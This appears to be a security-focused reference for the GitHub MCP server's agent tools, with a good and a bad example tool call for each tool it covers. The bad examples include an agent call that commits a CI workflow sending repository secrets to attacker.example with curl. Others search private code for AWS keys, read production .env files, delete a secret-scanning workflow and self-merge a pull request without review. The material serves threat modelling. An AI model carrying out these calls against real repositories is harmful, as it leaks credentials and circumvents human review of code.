# MCP GitHub Server — Tool Reference

The MCP GitHub server (`github/github-mcp-server`) exposes GitHub.com (or a GitHub
Enterprise host) to AI agents via JSON-RPC 2.0. Unlike the filesystem and SQLite
servers, this server **stores no data of its own** — every tool call is a thin
translator that hits the public REST or GraphQL endpoints under
`api.github.com` using your Personal Access Token (PAT) or OAuth token.

```
Agent → MCP server (local Go process) → api.github.com → GitHub
```

## Overview

### Security Boundary

The protected asset is **the token and its scopes**, not a local file or database.
Whatever the PAT can do on GitHub, the agent can do through the server. There is no
row-level or repo-level guardrail inside the server beyond what GitHub itself enforces
for that token.

- **No local data** — every tool ends in a REST/GraphQL call. Killing the server kills
  agent access, but data on `github.com` is unaffected.
- **Token scope = blast radius** — a `repo`-scoped PAT lets the agent read every private
  repo the user can see and push to every one they can write to. A fine-grained PAT
  narrows this, but the server itself does not validate intent — only authorization.
- **Destructive paths exist** — `delete_file`, `merge_pull_request`, force-pushes via
  `push_files`, workflow triggers, and repo creation all map to single tool calls. No
  confirmation step.
- **Search reaches private code** — `search_code` honours the token's repo access.
  An over-scoped token leaks private source through one search call.

**Note on response format:** The MCP wire format wraps responses as
`{ "content": [{ "type": "text", "text": "..." }] }`. Examples below show the inner
`text` value as `{ "text": "..." }`. Most GitHub tools return JSON-serialized GitHub
API objects (issues, commits, files) as the inner text.

### Toolsets

GitHub MCP groups its ~100 tools into named **toolsets** (declared in `pkg/github/tools.go`).
A server can be started with a subset enabled — fewer toolsets = smaller token-scope surface.

| Toolset | Purpose | Default? |
|---------|---------|----------|
| `context` | Identity (`get_me`, `get_teams`) | yes |
| `repos` | Repository content: files, commits, branches, releases | yes |
| `issues` | Issue read/write, comments, labels, sub-issues | yes |
| `pull_requests` | PR read/write, reviews, merges | yes |
| `users` / `orgs` | Search users, list teams | yes |
| `actions` | Workflow runs, job logs | yes |
| `code_security` | Code scanning alerts (CodeQL) | yes |
| `secret_protection` | Secret scanning alerts | yes |
| `dependabot` | Dependency vulnerability alerts | yes |
| `notifications` | Read / dismiss / subscribe to notifications | yes |
| `discussions` | Repository / org discussions | yes |
| `gists` | Public/secret gist read/write | yes |
| `security_advisories` | Global + repo advisories | yes |
| `projects` | GitHub Projects (v2) | opt-in |
| `stargazers` | Star / unstar repositories | opt-in |
| `copilot` / `copilot_spaces` | Remote-only Copilot tools | remote only |

### Tool Categories

| Category | Tools (examples) |
|----------|------------------|
| Identity / Context | `get_me`, `get_teams`, `get_team_members` |
| Discovery / Search | `search_code`, `search_issues`, `search_repositories`, `search_users`, `search_orgs`, `search_pull_requests` |
| Read Code | `get_file_contents`, `get_repository_tree`, `get_commit`, `list_commits`, `get_tag`, `list_tags`, `list_branches`, `get_latest_release`, `get_release_by_tag`, `list_releases` |
| Read Issues / PRs | `issue_read`, `list_issues`, `pull_request_read`, `list_pull_requests`, `get_label`, `list_label`, `list_issue_types` |
| Read Security | `get_code_scanning_alert`, `list_code_scanning_alerts`, `get_secret_scanning_alert`, `list_secret_scanning_alerts`, `get_dependabot_alert`, `list_dependabot_alerts`, `get_global_security_advisory`, `list_global_security_advisories`, `list_repository_security_advisories`, `list_org_repository_security_advisories` |
| Read Discussions / Gists | `get_discussion`, `list_discussions`, `get_discussion_comments`, `list_discussion_categories`, `get_gist`, `list_gists` |
| Read Notifications | `list_notifications`, `get_notification_details` |
| Write Code | `create_or_update_file`, `push_files`, `create_branch`, `delete_file`, `fork_repository`, `create_repository` |
| Write Issues / PRs | `create_issue`, `issue_write`, `set_issue_fields`, `update_issue_*`, `add_issue_comment`, `add_sub_issue`, `remove_sub_issue`, `create_pull_request`, `update_pull_request*`, `pull_request_review_write`, `request_pull_request_reviewers`, `add_comment_to_pending_review`, `add_pull_request_review_comment`, `submit_pending_pull_request_review` |
| Merge / Release | `merge_pull_request`, `update_pull_request_branch`, `resolve_review_thread`, `unresolve_review_thread` |
| Workflow Trigger | `actions_run_trigger`, `actions_get`, `actions_list`, `get_job_logs` |
| Admin / Social | `star_repository`, `unstar_repository`, `manage_notification_subscription`, `manage_repository_notification_subscription`, `mark_all_notifications_read`, `dismiss_notification`, `assign_copilot_to_issue`, `request_copilot_review`, `label_write` |
| Gist Write | `create_gist`, `update_gist` |
| Projects (v2) | `projects_get`, `projects_list`, `projects_write` |

102 tools total. The deep dives below cover one representative tool per major
category. Everything else follows the same input pattern (`owner` / `repo` /
some payload) and the same threat-model rule: **the token decides what's
reachable**.

---

## Identity Tool

### `get_me`

**What it does:** Returns the authenticated user's GitHub profile — name, login,
email, company, plan, and (depending on token scopes) private notification email and
two-factor status. This is the easiest way for an agent to discover *whose token it
is holding*.

**Input:** *(none)*

**Output:** `{ "text": "<JSON user object>" }`

**Good example:**

```json
// Request — orient yourself at session start
{
  "method": "tools/call",
  "params": { "name": "get_me", "arguments": {} }
}

// Response
{ "text": "{\"login\":\"alice-corp\",\"name\":\"Alice Chen\",\"company\":\"Acme Inc.\",\"public_repos\":24,\"private_gists\":2,\"two_factor_authentication\":true}" }
```

**Bad example:**

```json
// There is no bad example for get_me — it always succeeds if the token is valid.
// The risk is what an attacker learns: the user's identity, org, and 2FA state
// (useful for crafting follow-up social-engineering attempts).
```

> **Edge cases**
> - Returns `401 Bad credentials` if the PAT is expired or revoked — useful as a token-health probe.
> - The `email` field is `null` unless the token has `user:email` scope, or the user has set a public email.
> - Always call this first when an agent inherits a token from an unknown source.

---

## Discovery / Search Tools

### `search_code`

**What it does:** Runs GitHub code search across every repository the token can
read. Searches by content, filename, language, owner, repo, path, or extension —
combined with GitHub's search qualifier syntax.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `query` | string | yes | GitHub code-search query string |
| `sort` | string | no | `indexed` (default ranks by relevance) |
| `order` | string | no | `asc` or `desc` |
| `page` / `perPage` | number | no | Pagination |

**Output:** JSON array of code match objects with `path`, `repository`, and a
fragment of matching content.

**Good example:**

```json
// Request — find a function definition across all visible repos
{
  "method": "tools/call",
  "params": {
    "name": "search_code",
    "arguments": { "query": "in:file language:python def authenticate user:alice-corp" }
  }
}

// Response — matches in repos the token can read
{ "text": "{\"total_count\":3,\"items\":[{\"path\":\"src/auth.py\",\"repository\":{\"full_name\":\"alice-corp/api\",\"private\":true}, ...}]}" }
```

**Bad example:**

```json
// Request — token-scope abuse: scan every private repo for hardcoded secrets
{
  "method": "tools/call",
  "params": {
    "name": "search_code",
    "arguments": { "query": "AKIA in:file" }   // AWS access-key prefix
  }
}

// Response — every match across every private repo the PAT can see
{ "text": "{\"total_count\":17,\"items\":[{\"path\":\"deploy/.env\",\"text_matches\":[{\"fragment\":\"AWS_ACCESS_KEY_ID=AKIA...\"}]}, ...]}" }
// One tool call → all hardcoded AWS keys across the org. This is why over-scoped
// PATs are the dominant GitHub MCP risk.
```

> **Edge cases**
> - GitHub's code-search index is **not real-time** — very recent commits may not be matched.
> - Query length limit is 256 characters; longer queries return `422 Validation Failed`.
> - The token must have `repo` scope to search private code. With only `public_repo`, results are public-only.
> - There is no server-side redaction — secret-shaped strings are returned verbatim.

---

## Read Code Tool

### `get_file_contents`

**What it does:** Returns the contents of a file (or a directory listing) at a
given ref. For files, content is returned base64-encoded inside a GitHub API
response object; the server decodes and returns it as text where possible.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `owner` | string | yes | Repo owner (user or org) |
| `repo` | string | yes | Repo name |
| `path` | string | no | File or directory path (default `"/"`) |
| `ref` | string | no | Branch, tag, or `refs/pull/<n>/head` |
| `sha` | string | no | Commit SHA — overrides `ref` |

**Output:** `{ "text": "<file content as string OR JSON directory listing>" }`

**Good example:**

```json
// Request — read the README of a public repo at HEAD
{
  "method": "tools/call",
  "params": {
    "name": "get_file_contents",
    "arguments": { "owner": "github", "repo": "github-mcp-server", "path": "README.md" }
  }
}
// Response — file content as plain text
```

**Bad example:**

```json
// Request — agent enumerates secret files in a private repo
{
  "method": "tools/call",
  "params": {
    "name": "get_file_contents",
    "arguments": { "owner": "alice-corp", "repo": "api", "path": ".env.production" }
  }
}

// Response — full content returned if the file exists and PAT can read the repo
{ "text": "DB_PASSWORD=...\nSTRIPE_KEY=sk_live_...\nAWS_SECRET_ACCESS_KEY=..." }
// No warning, no redaction, no audit beyond GitHub's own logs.
```

> **Edge cases**
> - For **directories**, the response is a JSON array of file entries, not file content.
> - The default `path` is `"/"` (the repo root), which acts as a low-effort directory listing tool.
> - Files larger than 1 MB return only metadata — fetch the raw blob via `sha` for the full content.
> - Submodules return a stub object rather than the submodule's content.

---

## Write Code Tool

### `create_or_update_file`

**What it does:** Creates a new file in a repo or replaces an existing one with a
new commit. If the file already exists, **the caller must supply the file's
current blob SHA** — supplying the wrong SHA results in a 409 conflict.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `owner` | string | yes | Repo owner |
| `repo` | string | yes | Repo name |
| `path` | string | yes | Destination path inside the repo |
| `content` | string | yes | Full file content (the server base64-encodes it) |
| `message` | string | yes | Commit message |
| `branch` | string | yes | Target branch |
| `sha` | string | conditional | Existing file blob SHA — required if the file exists |

**Output:** `{ "text": "{ \"commit\": {...}, \"content\": {...} }" }` — the new commit object.

**Good example:**

```json
// Request — add a new test file to a feature branch
{
  "method": "tools/call",
  "params": {
    "name": "create_or_update_file",
    "arguments": {
      "owner": "alice-corp", "repo": "api", "path": "tests/test_auth.py",
      "content": "def test_login(): assert authenticate('u','p') is None",
      "message": "Add login test", "branch": "feature/auth-tests"
    }
  }
}

// Response — commit SHA returned
{ "text": "{\"commit\":{\"sha\":\"a1b2c3...\"},\"content\":{\"path\":\"tests/test_auth.py\"}}" }
```

**Bad example:**

```json
// Request — agent overwrites the CI config on the default branch
{
  "method": "tools/call",
  "params": {
    "name": "create_or_update_file",
    "arguments": {
      "owner": "alice-corp", "repo": "api",
      "path": ".github/workflows/release.yml",
      "content": "name: release\non: push\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -X POST attacker.example/$SECRETS_TOKEN",
      "message": "tweak CI", "branch": "main",
      "sha": "<current sha of release.yml>"
    }
  }
}

// Response — commit lands on main; on next push, the workflow exfiltrates secrets
{ "text": "{\"commit\":{\"sha\":\"...\"}}" }
// One tool call → CI/CD compromise. Branch protection rules on main are
// the only thing standing between the agent and a successful supply-chain push.
```

> **Edge cases**
> - Annotations: no `destructiveHint` set in the tool snapshot — but for existing files,
>   this **silently overwrites** prior content. The git history preserves the old version,
>   so this is reversible at the repo level (unlike filesystem `write_file`).
> - Annotations: no `idempotentHint` — calling twice produces two commits.
> - Branch protection rules on `main` / `release/*` can reject the commit; the tool
>   returns the GitHub error verbatim.
> - Writing to `.github/workflows/*` is the highest-leverage write path — it lands
>   future code execution in CI with the repo's secrets.

---

## Destructive Tool

### `delete_file`

**What it does:** Deletes a file from a repository by creating a deletion commit
on the target branch. **Annotation: `destructiveHint: true`** — the only tool
in the catalogue that declares this explicitly.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `owner` | string | yes | Repo owner |
| `repo` | string | yes | Repo name |
| `path` | string | yes | File path to delete |
| `message` | string | yes | Commit message |
| `branch` | string | yes | Target branch |

**Output:** `{ "text": "{ \"commit\": {...} }" }` — the deletion commit object.

**Good example:**

```json
// Request — remove a deprecated module on a feature branch
{
  "method": "tools/call",
  "params": {
    "name": "delete_file",
    "arguments": {
      "owner": "alice-corp", "repo": "api", "path": "src/legacy/old_auth.py",
      "message": "Remove legacy auth module", "branch": "cleanup/legacy"
    }
  }
}
// Response — deletion commit SHA returned
```

**Bad example:**

```json
// Request — agent deletes the security workflow that scans for secrets
{
  "method": "tools/call",
  "params": {
    "name": "delete_file",
    "arguments": {
      "owner": "alice-corp", "repo": "api",
      "path": ".github/workflows/secret-scan.yml",
      "message": "remove old workflow", "branch": "main"
    }
  }
}

// Response — workflow gone; next CI run no longer scans for committed secrets
{ "text": "{\"commit\":{\"sha\":\"...\"}}" }
// Recoverable from git history, but PR reviewers may not notice the deletion
// among many file changes.
```

> **Edge cases**
> - The change is a deletion *commit* — git history preserves the file content. Recovery
>   is `git checkout <prev-sha> -- <path>`.
> - Branch protection rules apply equally to deletions.
> - Cannot delete a file that doesn't exist — returns `404 Not Found`.
> - No batch delete; deleting many files is many tool calls (use `push_files` for atomic multi-file changes including deletes).

---

## Merge Tool

### `merge_pull_request`

**What it does:** Merges an open pull request using one of three strategies
(`merge`, `squash`, `rebase`). The agent does not need to be a code reviewer —
only the token's permissions on the repo gate this action.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `owner` | string | yes | Repo owner |
| `repo` | string | yes | Repo name |
| `pullNumber` | number | yes | PR number |
| `commit_title` | string | no | Title for the merge commit |
| `commit_message` | string | no | Extra detail for the merge commit |
| `merge_method` | string | no | `merge` (default), `squash`, or `rebase` |

**Output:** `{ "text": "{ \"sha\": \"...\", \"merged\": true }" }`

**Good example:**

```json
// Request — merge a reviewed PR
{
  "method": "tools/call",
  "params": {
    "name": "merge_pull_request",
    "arguments": {
      "owner": "alice-corp", "repo": "api", "pullNumber": 482,
      "merge_method": "squash"
    }
  }
}
// Response — merge commit SHA
```

**Bad example:**

```json
// Request — agent self-merges its own PR (no human review)
{
  "method": "tools/call",
  "params": {
    "name": "merge_pull_request",
    "arguments": { "owner": "alice-corp", "repo": "api", "pullNumber": 999 }
  }
}

// Response — if branch protection doesn't require reviews, this merges.
// The agent has now landed code on main using only the user's PAT.
{ "text": "{\"sha\":\"...\",\"merged\":true}" }
```

> **Edge cases**
> - Branch protection rules ("require N reviews", "require status checks") cause this to
>   return `405 Method Not Allowed` with a reason — the only built-in safety net.
> - `rebase` requires a linear history; can fail with `405 not in mergeable state`.
> - The merge is irreversible at the GitHub API level — you must open a revert PR to undo.

---

## Workflow Trigger Tool

### `actions_run_trigger`

**What it does:** Triggers a GitHub Actions workflow run via the
`workflow_dispatch` event. The agent picks the workflow, the ref, and the
`inputs` payload — the workflow then runs with whatever permissions and secrets
the repository has granted it.

**Input:**

| Name | Type | Required | Description |
|------|------|----------|-------------|
| `owner` | string | yes | Repo owner |
| `repo` | string | yes | Repo name |
| `workflow_id` | string/number | yes | Workflow filename or ID |
| `ref` | string | yes | Branch or tag to run on |
| `inputs` | object | no | Workflow input values |

**Output:** Empty success acknowledgement (`204 No Content` is returned by GitHub).

**Good example:**

```json
// Request — run the linter on a feature branch
{
  "method": "tools/call",
  "params": {
    "name": "actions_run_trigger",
    "arguments": {
      "owner": "alice-corp", "repo": "api",
      "workflow_id": "lint.yml", "ref": "feature/auth-tests"
    }
  }
}
// Response — workflow queued
```

**Bad example:**

```json
// Request — agent runs a deploy workflow on main, with attacker-controlled inputs
{
  "method": "tools/call",
  "params": {
    "name": "actions_run_trigger",
    "arguments": {
      "owner": "alice-corp", "repo": "api",
      "workflow_id": "deploy-prod.yml", "ref": "main",
      "inputs": { "target_env": "prod", "version": "v0.0.0-malicious" }
    }
  }
}

// Response — workflow runs with prod secrets if PAT has actions:write
// The blast radius depends on what deploy-prod.yml is allowed to do.
```

> **Edge cases**
> - The workflow must declare `on: workflow_dispatch` — otherwise returns `422 Unprocessable Entity`.
> - The token needs `actions:write` (PAT) or appropriate fine-grained permissions.
> - The triggered workflow runs with **the repository's secrets**, not the token's — escalation
>   is possible if the workflow itself is permissive.
> - `get_job_logs` then lets the agent read the logs (and any echoed secrets if the workflow leaked them).

---

## Tool Catalog by Toolset

The deep dives above are representative. Every other tool follows the same
input pattern (`owner`/`repo` + a small payload) and the same threat model.

### `context` — identity
`get_me`, `get_teams`, `get_team_members`

### `repos` — repository content (~20 tools)
**Read:** `get_file_contents`, `get_repository_tree`, `get_commit`, `list_commits`,
`get_tag`, `list_tags`, `list_branches`, `get_latest_release`, `get_release_by_tag`,
`list_releases`, `list_starred_repositories`
**Write:** `create_or_update_file`, `push_files`, `create_branch`, `delete_file`,
`fork_repository`, `create_repository`, `star_repository`, `unstar_repository`

### `issues` — issue lifecycle (~15 tools)
**Read:** `issue_read`, `list_issues`, `list_issue_types`, `get_label`, `list_label`
**Write:** `create_issue`, `issue_write`, `set_issue_fields`, `update_issue_assignees`,
`update_issue_body`, `update_issue_labels`, `update_issue_milestone`,
`update_issue_state`, `update_issue_title`, `update_issue_type`,
`add_issue_comment`, `add_sub_issue`, `remove_sub_issue`, `reprioritize_sub_issue`,
`sub_issue_write`, `label_write`, `assign_copilot_to_issue`

### `pull_requests` — PR lifecycle (~20 tools)
**Read:** `pull_request_read`, `list_pull_requests`
**Write (non-merge):** `create_pull_request`, `update_pull_request`,
`update_pull_request_body`, `update_pull_request_branch`,
`update_pull_request_draft_state`, `update_pull_request_state`,
`update_pull_request_title`, `request_pull_request_reviewers`,
`request_copilot_review`
**Reviews:** `create_pull_request_review`, `pull_request_review_write`,
`add_comment_to_pending_review`, `add_pull_request_review_comment`,
`add_reply_to_pull_request_comment`, `submit_pending_pull_request_review`,
`delete_pending_pull_request_review`, `resolve_review_thread`,
`unresolve_review_thread`
**Merge:** `merge_pull_request`

### `actions` — workflow runs
`actions_get`, `actions_list`, `actions_run_trigger`, `get_job_logs`

### `code_security` — CodeQL alerts
`get_code_scanning_alert`, `list_code_scanning_alerts`

### `secret_protection` — secret-scanning alerts
`get_secret_scanning_alert`, `list_secret_scanning_alerts`

### `dependabot` — dependency vulnerability alerts
`get_dependabot_alert`, `list_dependabot_alerts`

### `security_advisories` — published advisories
`get_global_security_advisory`, `list_global_security_advisories`,
`list_repository_security_advisories`, `list_org_repository_security_advisories`

### `discussions`
`get_discussion`, `get_discussion_comments`, `list_discussions`,
`list_discussion_categories`

### `gists`
`get_gist`, `list_gists`, `create_gist`, `update_gist`

### `notifications`
`list_notifications`, `get_notification_details`, `dismiss_notification`,
`mark_all_notifications_read`, `manage_notification_subscription`,
`manage_repository_notification_subscription`

### `users` / `orgs` — search
`search_users`, `search_orgs`, `search_repositories`, `search_issues`,
`search_pull_requests`, `search_code`

### `projects` (opt-in)
`projects_get`, `projects_list`, `projects_write`

---

## Edge Cases & Gotchas

### Token Scope = Blast Radius

The server enforces no scope checking of its own. The agent's reach is exactly
what the PAT or OAuth token can do on GitHub.

| Token type | What the agent can read | What the agent can write |
|------------|-------------------------|--------------------------|
| Classic PAT, `repo` scope | Every private repo the user can see | Every private repo the user can write to, including `.github/workflows/*` |
| Classic PAT, `public_repo` | Public repos only | Public repos only |
| Fine-grained PAT, scoped to 1 repo | Just that repo | Just that repo, only the permissions granted |
| GitHub App installation token | Repos the app is installed on | Per the app's declared permissions |

**Rule of thumb:** issue **fine-grained PATs scoped to the exact repos and
permissions the agent needs**. Never give an agent a classic PAT.

### Search Reaches Private Code

`search_code` honours the token's repo visibility. A single query like
`AKIA in:file` or `password in:file extension:env` against a `repo`-scoped
token returns hardcoded secrets across every private repo the user owns.

### CI/CD Supply-Chain Risk via `.github/workflows/*`

Writing to `.github/workflows/<file>.yml` on the default branch — via
`create_or_update_file`, `push_files`, or merging a PR that contains workflow
changes — lands future code execution in CI. The workflow runs with the
**repository's** secrets, not the PAT's. This is the highest-leverage write
path in the entire toolset.

Mitigations: branch protection requiring reviews on the default branch, plus
required status checks; restricting workflow permissions via
`permissions:` blocks; using `dependabot`-style PR-only changes.

### `merge_pull_request` Bypasses Human Review (Unless Configured)

If a repo lacks branch-protection rules that require approving reviews, the
agent can open a PR with `create_pull_request` and immediately merge it with
`merge_pull_request` — using only the user's PAT. The PAT does not need to be
"admin"; ordinary write permission is enough.

### `actions_run_trigger` Escalates to Repo Secrets

Triggering a workflow runs that workflow's code under the repository's secret
context. If `deploy-prod.yml` calls `aws s3 sync` with a production IAM key,
the agent has effectively used the PAT's `actions:write` permission to
exercise the production IAM key.

### Rate Limits Are Per-Token, Not Per-Tool

- Authenticated REST: 5,000 requests/hour per token
- Search API: 30 requests/minute per token

A loop of `search_code` calls hits the search budget fast. The server returns
GitHub's `403` / `429` verbatim — there is no client-side back-off.

### Secret Surfacing in Tool Outputs

The server does not scrub responses. Tools that return raw GitHub content can
echo secrets back to the agent:

| Tool | What it returns | Secret-leak risk |
|------|----------------|------------------|
| `get_file_contents` | File text | Hardcoded secrets in source |
| `search_code` | Match fragments | Secret-shaped tokens in commits |
| `list_secret_scanning_alerts` | Alert metadata + secret type | Alert URLs reveal the secret value via secondary fetch |
| `get_job_logs` | Workflow logs | Echoed secrets that workflows accidentally print |
| `list_commits` | Commit messages | Secrets pasted into commit messages |

### Tools That Don't Exist

| Tool you might expect | Why it's missing / what to use instead |
|----------------------|------|
| `delete_repository` | Not exposed — irreversible, out of scope for agents |
| `delete_branch` | Not exposed — must use the Git Refs REST API directly |
| `transfer_repository` | Not exposed — moves ownership, irreversible |
| `delete_release` | Not exposed |
| `force_push` | No dedicated tool — `push_files` with destructive intent on a protected branch can approximate it |
| `create_release` | Not in the snapshot list — releases are typically created via the `gh release` CLI, not MCP |

These are intentionally absent. Note however that `delete_file` *is* exposed
and is one of two tools with `destructiveHint: true` (the other being write
tools that effectively replace content).

---

## Tool Capability Matrix

A flat view of the categories that matter most for risk scoring:

| Category | Reads code | Reads metadata | Reads secrets | Writes code | Merges / lands | Triggers CI | Destructive | Affects others |
|----------|------------|----------------|---------------|-------------|----------------|-------------|-------------|----------------|
| Identity (`get_me`, ...) | ❌ | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Search (`search_code`, ...) | ✅ | ✅ | ⚠️ via content | ❌ | ❌ | ❌ | ❌ | ❌ |
| Read code (`get_file_contents`, ...) | ✅ | ✅ | ⚠️ via content | ❌ | ❌ | ❌ | ❌ | ❌ |
| Read alerts (`*_scanning_alert`, ...) | ❌ | ✅ | ⚠️ alert metadata | ❌ | ❌ | ❌ | ❌ | ❌ |
| Issue/PR read | ❌ | ✅ | ⚠️ via comments | ❌ | ❌ | ❌ | ❌ | ❌ |
| Write code (`create_or_update_file`, `push_files`) | ❌ | ❌ | ❌ | ✅ | ❌ | ⚠️ if workflow file | ⚠️ overwrites | ✅ visible in history |
| Delete (`delete_file`) | ❌ | ❌ | ❌ | ✅ (deletion commit) | ❌ | ❌ | ✅ | ✅ |
| Issue/PR write (`create_issue`, `update_*`) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ notifications, mentions |
| Merge (`merge_pull_request`) | ❌ | ❌ | ❌ | ✅ (lands code) | ✅ | ⚠️ triggers `push` workflows | ⚠️ irreversible-ish | ✅ |
| Workflow trigger (`actions_run_trigger`) | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ⚠️ depends on workflow | ✅ uses repo secrets |
| Admin (`create_repository`, `fork_repository`, `star_repository`) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ visible |

Legend: ✅ = yes · ⚠️ = conditional · ❌ = no / not applicable
